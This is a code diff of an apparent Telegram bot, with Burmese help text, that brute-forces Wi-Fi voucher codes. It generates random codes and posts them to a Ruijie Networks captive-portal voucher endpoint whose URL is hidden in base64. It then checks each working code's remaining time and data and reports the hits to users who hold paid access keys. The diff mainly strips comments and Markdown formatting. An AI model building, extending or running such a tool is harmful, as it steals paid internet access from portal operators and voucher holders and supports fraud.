@@ -22,17 +22,17 @@ PORTAL_BASE = f"https://{PORTAL_HOST}"
 SUCCESS_CODE = asyncio.Queue()
 bot = AsyncTeleBot(BOT_TOKEN)
 
-user_data = {}              # {chat_id: {"session_url": ...}}
-approve = {}                # {chat_id: True/False}
-scan_tasks = {}             # {chat_id: {"task": asyncio.Task, "stop": bool, "scan_id": str}}
-success_texts = {}          # {chat_id: [{"code", "session_id", "plan", "usage", "expire"}, ...]}
-limited_texts = {}          # {chat_id: [code, ...]}
-captcha_state = {}          # captcha cache per chat_id
+user_data = {}
+approve = {}
+scan_tasks = {}
+success_texts = {}
+limited_texts = {}
+captcha_state = {}
 
-notify_setting = {}         # {chat_id: True/False}
+notify_setting = {}
 DEFAULT_NOTIFY = True
-last_scan_params = {}       # {chat_id: {"mode", "length", "target", "plan_filters"}}
-pending_brute = {}          # {chat_id: {"mode", "length", "target", "plan_filters"}}
+last_scan_params = {}
+pending_brute = {}
 success_messages = {}
 limited_messages = {}
 
@@ -153,7 +153,6 @@ def _parse_minutes(val):
     return f"{months}mo {rem_days}d" if rem_days else f"{months}mo"
 
 def _fmt_bytes(n):
-    """bytes → human readable"""
     try:
         n = float(n)
     except Exception:
@@ -165,17 +164,12 @@ def _fmt_bytes(n):
     return f"{n:.2f} PB"
 
 def _humanize_plan(name):
-    """SML_1Hour → 1Hour"""
     if not name:
         return ""
     m = re.match(r'^[A-Z]+_(.+)$', name)
     return m.group(1) if m else name
 
 async def get_balance(token):
-    """
-    Fetch remaining time + usage + plan for a token.
-    Returns dict {"time", "usage", "plan", "expire"} or "N/A".
-    """
     url = f"{PORTAL_BASE}/api/auth/balance/getBalance/{token}"
     cookies = {
         'sensorsdata2015jssdkcross': '%7B%22distinct_id%22%3A%2219e460ef444507-091ef90c028745-1e462c6e-343089-19e460ef4452ab%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllNDYwZWY0NDQ1MDctMDkxZWY5MGMwMjg3NDUtMWU0NjJjNmUtMzQzMDg5LTE5ZTQ2MGVmNDQ1MmFiIn0%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e460ef444507-091ef90c028745-1e462c6e-343089-19e460ef4452ab%22%7D',
@@ -224,8 +218,6 @@ async def get_balance(token):
             for d in candidates:
                 if not isinstance(d, dict):
                     continue
-
-                # Time
                 if time_str == "N/A":
                     for k in ('totalMinutes', 'remainingMinutes', 'remainMinutes',
                               'leftMinutes', 'balance', 'remaining'):
@@ -236,8 +228,6 @@ async def get_balance(token):
                                   'leftTime', 'timeLeft', 'remain_time'):
                             if d.get(k) is not None:
                                 time_str = _parse_seconds(d[k]); break
-
-                # Usage / Quota
                 if not usage_str:
                     used  = (d.get('usedBytes') or d.get('usageBytes') or
                              d.get('usedTraffic') or d.get('used'))
@@ -245,13 +235,9 @@ async def get_balance(token):
                              d.get('totalTraffic') or d.get('quota'))
                     if used is not None and total is not None:
                         usage_str = f"{_fmt_bytes(used)} / {_fmt_bytes(total)}"
-
-                # Plan
                 plan_raw = d.get('plan') or d.get('planName') or d.get('internetPlan')
                 if plan_raw and not plan_str:
                     plan_str = _humanize_plan(plan_raw)
-
-                # Expire
                 exp_raw = (d.get('expireTime') or d.get('expiresAt') or
                            d.get('expire_time') or d.get('expiry'))
                 if exp_raw and not expire_str:
@@ -268,7 +254,6 @@ async def get_balance(token):
         return "N/A"
 
 def iter_codes(mode, length):
-    """Generate codes for modes 1–5."""
     if mode == "1":   chars = string.digits
     elif mode == "2": chars = string.ascii_lowercase
     elif mode == "3": chars = string.ascii_uppercase
@@ -276,7 +261,6 @@ def iter_codes(mode, length):
     elif mode == "5": chars = string.ascii_lowercase + string.digits
     else:
         raise ValueError(f"Unsupported scan mode: {mode}. Use 1-5.")
-
     while True:
         yield "".join(random.choice(chars) for _ in range(length))
 
@@ -415,7 +399,6 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
         if not current_task or current_task.get("scan_id") != scan_id:
             return
 
-    # base64: https://portal-mm-as.ruijienetworks.com/api/auth/voucher/?lang=en_US
     post_url = base64.b64decode(
         b'aHR0cHM6Ly9wb3J0YWwtbW0tYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
     ).decode()
@@ -496,7 +479,6 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
         if recheck:
             return code
 
-        # Fetch plan + usage + expire
         plan_str = "N/A"
         usage_str = ""
         expire_str = ""
@@ -521,7 +503,6 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
         except Exception:
             pass
 
-        # Plan filter
         if plan_filters:
             code_mins = plan_to_minutes(plan_str)
             if not any(code_mins >= plan_to_minutes(f) for f in plan_filters):
@@ -540,24 +521,21 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
         await SUCCESS_CODE.put({"chat_id": chat_id, "code": code,
                                 "session_id": session_id, "plan": plan_str})
 
-        # Notification
         if notify_setting.get(chat_id, DEFAULT_NOTIFY) and message:
             code_line = "\n".join([
-                f"`{item['code']}` – ⏳ {item['plan']}"
+                f"{item['code']} – ⏳ {item['plan']}"
                 + (f" | 📶 {item['usage']}" if item.get('usage') else "")
                 for item in success_texts[chat_id]
             ])
             try:
                 if chat_id not in success_messages:
-                    sent = await bot.send_message(chat_id, f"✅ Success Codes:\n{code_line}",
-                                                  parse_mode="Markdown")
+                    sent = await bot.send_message(chat_id, f"✅ Success Codes:\n{code_line}")
                     success_messages[chat_id] = sent.message_id
                 else:
                     await bot.edit_message_text(
                         chat_id=chat_id,
                         message_id=success_messages[chat_id],
-                        text=f"✅ Success Codes:\n{code_line}",
-                        parse_mode="Markdown"
+                        text=f"✅ Success Codes:\n{code_line}"
                     )
             except:
                 pass
@@ -715,8 +693,9 @@ async def start(message):
 
 @bot.message_handler(commands=['help'])
 async def help_cmd(message):
+    # ⚠️ parse_mode မသုံး — Markdown error မတက်အောင်
     help_text = (
-        "📚 **Command လမ်းညွှန်**\n\n"
+        "📚 Command လမ်းညွှန်\n\n"
         "/key - သင်၏ key ကို အတည်ပြုရန်\n"
         "/setup [session_url] - Session URL သတ်မှတ်ရန်\n"
         "/brute <mode> <length> [target] [plan1] [plan2] ...\n"
@@ -741,7 +720,7 @@ async def help_cmd(message):
         "/listkeys - (Admin) Key များကြည့်ရန်\n"
         "/testbalance - (Admin) Success codes များ၏ balance စစ်ဆေးရန်"
     )
-    await bot.reply_to(message, help_text, parse_mode="Markdown")
+    await bot.reply_to(message, help_text)
 
 @bot.message_handler(commands=['key'])
 async def handle_key(message):
@@ -915,7 +894,7 @@ async def handle_resume_callback(call):
         await start_brute_scan(chat_id, params['mode'], params['length'],
                                params['target'], call.message,
                                plan_filters=params.get('plan_filters', []))
-    else:  # new_scan
+    else:
         if chat_id in pending_brute:
             params = pending_brute.pop(chat_id)
             last_scan_params.pop(chat_id, None)
@@ -941,26 +920,26 @@ async def saved_codes(message):
 
     parts = []
     if success:
-        parts.append(f"✅ **Success Codes** ({len(success)})")
+        parts.append(f"✅ Success Codes ({len(success)})")
         for item in success:
             c = item["code"]
             plan = item.get("plan", "N/A")
             usage = item.get("usage", "")
-            line = f"`{c}` – ⏳ {plan}"
+            line = f"{c} – ⏳ {plan}"
             if usage:
                 line += f" | 📶 {usage}"
             parts.append(line)
     if limited:
-        parts.append(f"\n⚠️ **Limited Codes** ({len(limited)})")
+        parts.append(f"\n⚠️ Limited Codes ({len(limited)})")
         parts.extend(limited)
 
     full_text = "\n".join(parts)
     MAX = 4096
     if len(full_text) > MAX:
         for i in range(0, len(full_text), MAX):
-            await bot.send_message(chat_id, full_text[i:i+MAX], parse_mode="Markdown")
+            await bot.send_message(chat_id, full_text[i:i+MAX])
     else:
-        await bot.reply_to(message, full_text, parse_mode="Markdown")
+        await bot.reply_to(message, full_text)
 
 @bot.message_handler(commands=['delete_saved'])
 async def delete_saved(message):
@@ -1078,14 +1057,13 @@ async def testbalance(message):
             async with session.get(url, headers=headers,
                                    timeout=aiohttp.ClientTimeout(total=15)) as resp:
                 raw = await resp.text()
-                result = (f"🎯 Code: `{code}`\n"
-                          f"🔑 Session ID: `{sid}`\n"
-                          f"📡 HTTP Status: `{resp.status}`\n\n"
-                          f"📦 Raw Response:\n```\n{raw[:2000]}\n```")
-                await bot.send_message(chat_id, result, parse_mode="Markdown")
+                result = (f"🎯 Code: {code}\n"
+                          f"🔑 Session ID: {sid}\n"
+                          f"📡 HTTP Status: {resp.status}\n\n"
+                          f"📦 Raw Response:\n{raw[:2000]}")
+                await bot.send_message(chat_id, result)
         except Exception as e:
-            await bot.send_message(chat_id, f"❌ Code `{code}` error: {e}",
-                                   parse_mode="Markdown")
+            await bot.send_message(chat_id, f"❌ Code {code} error: {e}")
 
 @bot.message_handler(commands=['genkey'])
 async def genkey(message):
